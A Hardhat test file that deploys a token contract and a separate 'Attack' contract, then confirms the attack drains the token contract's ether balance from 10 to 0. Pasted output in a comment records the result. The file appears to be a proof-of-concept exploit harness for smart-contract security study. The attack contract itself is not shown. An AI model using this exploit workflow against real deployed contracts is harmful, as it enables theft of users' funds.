const { ethers } = require('hardhat')
const { expect } = require("chai");

describe("Attack", function () {
  it("attack", async function () {
    const RZXToken = await ethers.getContractFactory("RZXToken")
    const rzxtoken = await RZXToken.deploy()
    //await this.rzxtoken.deployed()
    console.log(`RZXtoken address ${rzxtoken.address}`)

    const Attack = await ethers.getContractFactory("Attack")
    const attack = await Attack.deploy(rzxtoken.address)
    await attack.deployed()
    console.log(`attack address ${attack.address}`)

    const signers = await ethers.getSigners()
    const alice = signers[0]
    const bob = signers[1]
    const carol = signers[2]

    //console.log(token.address)
    let ether_100 = ethers.utils.parseUnits("10", "ether")
    await rzxtoken.buyToken({ value: ether_100 });

    let amount1 = await ethers.provider.getBalance(rzxtoken.address)
    console.log("before attack ", amount1)

    let ether_10 = ethers.utils.parseUnits("1", "ether")
    await attack.attack({ value: ether_10 });
    await attack.connect(bob).attack({ value: ether_10 })

    let amount2 = await ethers.provider.getBalance(rzxtoken.address)
    console.log("after attack ", amount2)
    expect(amount2).to.equal(0);

    // $ npx hardhat test
    // RZXtoken address 0x5FbDB2315678afecb367f032d93F642f64180aa3
    // attack address 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
    // before attack  BigNumber { value: "10000000000000000000" }
    // after attack  BigNumber { value: "0" }
    //     ✔ attack (2061ms)
  })
})
